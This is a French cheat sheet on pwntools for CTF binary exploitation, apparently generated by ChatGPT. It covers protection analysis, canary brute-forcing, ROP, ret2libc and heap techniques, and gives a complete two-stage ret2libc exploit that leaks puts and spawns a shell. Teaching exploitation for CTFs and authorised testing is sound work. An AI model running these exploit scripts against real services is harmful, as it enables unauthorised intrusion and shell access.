# Cheat-sheet pwntools — Du débutant à l'expert (en français)

> Objectif : une fiche complète, pratique et raisonnée pour aller de la connexion / téléchargement d’un binaire jusqu’à l’exploit final, en couvrant toutes les étapes, décisions et variantes courantes. Contient : principes, commandes, exemples `pwntools` (Python3), stratégies selon résultats, et quelques tricks avancés (gdb/pwngdb/gef, exécution de commandes pendant l’exécution, etc.).

> Pré-requis : Python3, `pwntools` (`pip install pwntools`), `gdb` + `pwndbg`/`gef`/`gef-extras` recommandés, `objdump`, `readelf`, `ldd`, `file`.

---

# 1. Workflow mental (pipeline d'exploitation)

1. **Récupération / connexion**
   - Télécharger le binaire / récupérer accès (HTTP, git, scp, SSH).
   - Se connecter au service distant (TCP/SSL/SSH) si challenge réseau.

2. **Recon statique**
   - `file`, `readelf -h`, `readelf -s`, `objdump -d`, `strings`, `ldd`.
   - Détecter : arch, bitness, PIE, NX, Canary, RELRO, libs liées.

3. **Recon dynamique**
   - Lancer localement, tester entrées, fuzz basique.
   - Debugger (gdb + pwndbg/gef) pour voir comportement.
   - Construire mini-tests (offsets avec `cyclic`).

4. **Planification**
   - Si fuite d'adresse possible → vise leak libc / leak PIE.
   - Si contrôle RIP sans NX → shellcode. Si NX → ROP / ret2libc.
   - Si canary present → leak canary ou bypass via format string/overflow heap.

5. **Construction exploit**
   - Préparer payload (padding, canary, saved rbp, ROP chain).
   - Local test → remote test → réglages (timeouts/logging).

6. **Post-exploit**
   - `p.interactive()` pour shell. Stabiliser reverse shell si nécessaire.

---

# 2. Connexions / téléchargement

## Connexions avec pwntools
```python
from pwn import *
# Local
p = process('./vuln')

# Remote TCP
p = remote('challs.example.com', 1337)

# Remote SSL
p = remote('challs.example.com', 443, ssl=True)

# Via SSH (récupérer & exécuter, utile si binaire accessible via SSH)
s = ssh('user', 'host', password='pwd')  # ou key
s.download('/remote/path/vuln', 'vuln_local')
p = s.process('/remote/path/vuln args')
```

---

# 3. Mise en place pwntools : contexte et helpers

```python
from pwn import *

# Context
context.binary = ELF('./vuln')  # infère arch/endianness
context.terminal = ['tmux','splitw','-h']  # pour gdb.attach
context.log_level = 'debug'  # info/debug/warn/error

elf = context.binary
```

Helpers souvent utilisés :
- `cyclic(n)`, `cyclic_find(value)` — trouver offset.
- `p64`, `u64` — packing/unpacking 64-bit.
- `ELF('vuln')` — symboles, GOT, PLT, sections.
- `ROP(elf)` — recherche gadgets et création de chaînes ROP.
- `ssh(...)`, `remote(...)`, `process(...)`.
- `gdb.debug([...], gdbscript=...)` — lancer process sous gdb.
- `gdb.attach(p, gdbscript='...')` — attacher à un process existant.

---

# 4. Analyse rapide des protections (cheat)

- **NX** (non-executable stack) : si actif → pas de shellcode sur stack → ROP/ret2libc.
- **PIE** : si actif → adresses du binaire relocalisées → besoin d'un leak pour connaître base.
- **Canary (stack protector)** : si présent → écriture qui double-écrase canary fait crash ; leak nécessaire ou autre vecteur.
- **RELRO (partial/full)** : `full` empêche GOT overwrite via `.got.plt` immuable.
- **ASLR** : empêche adresses fixes → need leak pour libc/base.
- **Fortify / NX/SMEP/SMAP** : influences avancées (SMEP/SMAP sur kernels, rare en CTF).

---

# 5. Phases d’exploitation détaillées — raisonnements possibles

## 5.1. Trouver l’offset d’écrasement (stack overflow simple)
- Envoyer pattern (`cyclic`) → crash → récupérer RIP.
- Avec core dump ou gdb : `x/i $rip` ou inspecter registre qui contient `cyclic` pattern.
- Calculer `offset = cyclic_find(rip_value)`.

```python
from pwn import *
p = process('./vuln')
p.sendline(cyclic(200))
p.wait()
core = p.corefile
rip_value = core.read(core.rsp, 8)  # ou core.rip
# plus simple : use cyclic_find on core.rip
```

## 5.2. Canary détecté → stratégies
- **Leak canary** via format string / info leak / printf vulnerability.
- **Stack pivot / ret2reg** rarement utile.
- **Bruteforce canary** (lent mais possible localement / si remote tolerant) : envoyer bytes un par un jusqu’à succès (détecter crash vs non crash). **Attention**: risques d'IP ban ; utiliser si safe.
- **Utiliser heap overflow/other vuln** pour contourner.

Brute force exemple (byte-par-byte) :
```python
canary = b'\x00'
for i in range(1,8):
    for b in range(256):
        p = remote('host',1337)
        payload = b'A'*offset + canary + bytes([b])
        p.sendline(payload)
        if not crashed(p):
            canary += bytes([b])
            break
```

## 5.3. NX actif mais pas PIE, pas Canary → ret2libc / ROP
- Si binaire non-PIE (addresses in binary fixed), on peut utiliser PLT/GOT leak or direct ret2libc if libc address known.
- Si libc inconnue, leak une adresse libc (e.g., `puts@GLIBC`), calculer libc base, trouver `system` et `"/bin/sh"` ou utiliser `one_gadget`.

Exemple leak + ret2libc :
1. ROP pour appeler `puts(puts@GOT)` ou `puts(printf@GOT)` puis retour au `main`.
2. Lire sortie, calculer base libc, construire rop `system("/bin/sh")`.

## 5.4. PIE actif → leak base binaire puis ROP/ret2libc
- Leak d’une adresse dans le binaire (retour d’une fonction, adresse dans GOT, or leaked RIP) pour calculer base `base = leaked - offset_in_elf`.
- Après leak, utiliser `ROP(base=base)` ou `ELF` avec base fixée.

## 5.5. Format string
- Peut permettre :
  - Lire mémoire (`%llx`).
  - Écrire mémoire (overwrite GOT entries).
- Stratégies :
  - Lire canary / PIE / libc pointer.
  - Overwrite `exit@GOT` ou `puts@GOT` to redirect flow.

## 5.6. Heap exploitation (fast summary)
- Reconnaître allocators (glibc malloc).
- Techniques courantes : fastbin dup/attack, unsorted-bin leak, tcache poisoning, House of Einherjar, House of Force, unlink (anciennes glibc).
- Objectif souvent : leak libc pointer ou overwrite __malloc_hook/free_hook/target function pointer.
- Utiliser `pwndbg`/`gef` pour inspecter heap layouts.

---

# 6. pwntools — snippets & patterns essentiels

## Template d’exploit commun (structure)
```python
#!/usr/bin/env python3
from pwn import *

exe = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # facultatif

context.binary = exe
context.log_level = 'info'  # debug pour plus d'infos

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote('host', 1337)
    elif args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript)
    else:
        return process([exe.path] + argv)

gdbscript = '''
break main
continue
'''

p = start()

# --- Example workflow ---
p.recvuntil(b'> ')
payload = flat(
    b'A'*offset,
    p64(pop_rdi),
    p64(next(exe.search(b'/bin/sh'))),
    p64(exe.plt['system'])
)

p.sendline(payload)
p.interactive()
```

## Utilitaires utiles
```python
# packing
p64(0x401000)
u64(data.ljust(8, b'\x00'))

# chercher gadgets
rop = ROP(exe)
rop.find_gadget(['pop rdi', 'ret'])
rop.chain()

# envoyer/recevoir
p.send(b'...')
p.sendlineafter(b'>', payload)
p.recvuntil(b'something')
p.recvline()
p.recv(timeout=1)

# interaction
p.interactive()
```

---

# 7. Debugging : gdb / pwngdb / gef / gdb.attach

## Lancer sous gdb avec pwntools
```python
p = gdb.debug(['./vuln'], gdbscript='break main\ncontinue')
```

## Attacher à un process (exécution locale)
```python
p = process('./vuln')
gdb.attach(p, gdbscript='b *main+120\nc')
```

## Exemple de gdbscript utile
```text
set pagination off
break *main+0x90
break *vuln_function
continue
```

## Exécuter des commandes pendant que binaire est lancé
- `gdb.attach(process, gdbscript='set logging on\nbt\ninfo registers')` exécute commandes gdb pendant exécution.
- Vous pouvez exécuter des commandes shell via `pwnlib.util.misc.run_once('command')` mais plus simple : utiliser `os.system()` dans le script qui contrôle le process (attention à la synchro).
- **Trick** : via `gdb.execute("call system(\"id > /tmp/id.txt\")")` depuis gdbscript — exécute commande sur la machine où gdb tourne (utile pour debugging automatisé).

Exemple : attacher et dumper mémoire
```python
gdb.attach(p, gdbscript='''
python
import gdb, sys
gdb.execute("dump memory /tmp/mem_dump 0x400000 0x401000")
end
''')
```

---

# 8. Comportements et décisions selon résultats (cheat logic)

### Situation A : Envoi du payload provoque segmentation fault immédiatement
- Vérifier offset ; utiliser `cyclic` pour confirmer.
- Vérifier écriture dans canary (si present).
- Lancer sous gdb pour voir registre (`$rip`, `$rsp`) et la cause.
- *Action* : ajuster padding / alignement / endianness.

### Situation B : Pas de crash mais pas de shell
- Peut être qu’on a atteint un `exit` ou la chaîne ROP n’est pas exécutée.
- Vérifier `ret` alignment sur x86_64 (stack alignment 16 bytes avant `call`).
- Vérifier si NX/ASLR/PIE empêche exécution — peut devoir leak.

### Situation C : Crash après canary écrasé
- Canary mal copié / longueur incorrecte → retrouver vraie valeur via leak ou brute force.

### Situation D : Leak d'adresse mais offsets incohérents
- Assurer que leak est d’un pointeur libc et non d’un pointeur PIE.
- Convertir l’adresse correctement (`u64(leak.ljust(8,b'\x00'))`).

---

# 9. Techniques avancées et tricks

## 9.1. `ret2csu` — appel de fonctions avec 6 premiers registres contrôlables
- `pop rbx; pop rbp; pop r12; pop r13; pop r14; pop r15; ret` chunk dans `__libc_csu_init` souvent utilisé pour appeler fonctions avec controlled args.
- Pwntools ROP peut extraire et construire cette pattern.

## 9.2. `ret2dlresolve` (dynamic linker hijack)
- Permet d’appeler `system` même si libc inconnue et sans leak, technique avancée : utiliser structures ELF pour forger symbol/relocation entries. Pwntools a des helpers externes (mais souvent on implémente soi-même).

## 9.3. `one_gadget`
- Trouver gadgets `one_gadget` dans libc (outil external) → exécute `execve("/bin/sh", ...)` si registres/stack satisfont contraintes. Utile si vous pouvez contrôler contexte après libc base leak.

## 9.4. `LD_PRELOAD` / `LD_LIBRARY_PATH` (local)
- Permet d'utiliser une library malveillante localement ; utile en test local où vous avez control over env.

## 9.5. Exécution de commandes pendant un run
- `gdb.execute('call system("...")')` dans `gdbscript` (déjà vu).
- `process.recv()`/`send()` permet d’envoyer commandes au binaire pendant son exécution (ex : interface interactive).
- `pwnlib.tubes.ssh.ssh().process()` permet d’exécuter des commandes sur un host distant via SSH.

## 9.6. Exploitation multi-étapes (staged exploit)
- Stage 1 : créer primitive (write-what-where or leak).
- Stage 2 : utiliser primitive pour écrire loader / ROP chain plus large.
- Pattern : envoyer petite payload initiale qui appelle `read(0, buf, size)` pour recevoir plus de shellcode/ROP.

## 9.7. Race conditions / TOCTOU / fork bombs (rare en CTF)
- Utiliser `fork()` ou threads pour exploiter temps ; pwntools n’aide pas directement mais script contrôle timing.

---

# 10. Exemple complet (mini-solution) — overflow x86_64 non PIE, NX, pas de canary

**Contexte** : `vuln` prend une ligne, a un overflow de 72 octets jusqu’à RIP. `system` est dans libc et `puts@got` contient une adresse libc; on peut appeler `puts(puts@got)` pour leak.

`readelf` montre non-PIE → on connaît `plt['puts']` et `got['puts']`.

### Exploit (explication étape-par-étape)
1. Find offset = 72 (ex: via `cyclic`).
2. Build ROP: `pop rdi; puts@got; puts@plt; main` → leak puts
3. Receive leak, calcul libc base.
4. ROP: `pop rdi; bin_sh_addr; system` (system from libc), or call system directly.

### Code
```python
#!/usr/bin/env python3
from pwn import *

exe = ELF('./vuln')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')  # adapt to remote libc if known

context.binary = exe
context.log_level = 'info'

def start():
    if args.REMOTE:
        return remote('challs.example.com', 1337)
    elif args.GDB:
        return gdb.debug([exe.path], gdbscript='b main\nc')
    else:
        return process([exe.path])

p = start()

# parameters (found via analysis)
offset = 72

# gadgets
rop = ROP(exe)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]

# Stage 1: leak puts
payload = flat(
    b'A'*offset,
    p64(pop_rdi),
    p64(exe.got['puts']),
    p64(exe.plt['puts']),
    p64(exe.symbols['main'])
)

p.sendline(payload)
p.recvline()                  # maybe prompt
leak = p.recvline().strip()   # read the leaked address line
puts_leak = u64(leak.ljust(8, b'\x00'))
log.info(f"puts leak: {hex(puts_leak)}")

libc_base = puts_leak - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh = libc_base + next(libc.search(b'/bin/sh'))

log.info(f"libc base: {hex(libc_base)}")
log.info(f"system: {hex(system)} binsh: {hex(binsh)}")

# Stage 2: get shell
payload2 = flat(
    b'A'*offset,
    p64(pop_rdi),
    p64(binsh),
    p64(system)
)

p.sendline(payload2)
p.interactive()
```

> Notes :
> - En remote CTF il faut souvent remplacer `libc` par la libc fournie par l’organisateur ou déduite via leaks.
> - Ajuster `recv` selon protocole (prompt, newline, etc.).

---

# 11. Bonnes pratiques & pièges fréquents

- Toujours fixer `context.arch` et `context.os` si nécessaire.
- Use `context.log_level = 'debug'` pendant debug — remettre sur `info` pour remote.
- Gérer `p.timeout` et `p.recv(timeout=...)` — éviter blocage.
- Test local → test remote, ne pas assumer la même libc.
- Vérifier little vs big endian ; pack/unpack correctement.
- Toujours vérifier alignement de la stack (x86_64 exigence d'alignement 16).
- Ne pas exposer attaques à IP bans — insert delays ou utiliser rate limits prudents.

---

# 12. Référence rapide de commandes utiles

- `ELF('vuln').symbols`, `.plt`, `.got`, `.data`, `.bss`
- `ROP(exe).dump()`, `.chain()`, `.find_gadget(...)`
- `cyclic(200)`, `cyclic_find(0x6161616c)`
- `p64()`, `u64()`, `flat(...)`
- `process('./vuln')`, `remote(host,port)`, `ssh(...)`
- `gdb.debug([...], gdbscript='...')`, `gdb.attach(proc, gdbscript='...')`
- `args.REMOTE`, `args.GDB` pour contrôle CLI (`python exploit.py REMOTE`)

---

# 13. Ressources avancées (à garder en tête)

- `pwntools` docs (API reference).
- `Ghidra` / `radare2` / `objdump` pour reverse.
- `pwndbg` / `gef` pour debugging.
- Tutoriaux sur heap exploitation, ret2dlresolve, ret2csu, format-string.
- `one_gadget` tool (pour gadgets dans libc).

---

# 14. Remarques finales & éthique

- Cette cheat-sheet est destinée à de l’apprentissage, CTF et tests d’intrusion autorisés.
- N’utilisez pas ces techniques sur des systèmes sans autorisation explicite.

---

# À propos

Fichier généré par ChatGPT — si tu veux je peux aussi :
- Générer un dépôt GitHub complet (README, LICENSE, .gitignore, `exploit_template.py`).
- Produire une version `README.md` adaptée pour GitHub (avec badges, instructions d'installation et exemple d'utilisation).
- Te fournir la série de commandes git pour initialiser et pousser le dépôt.



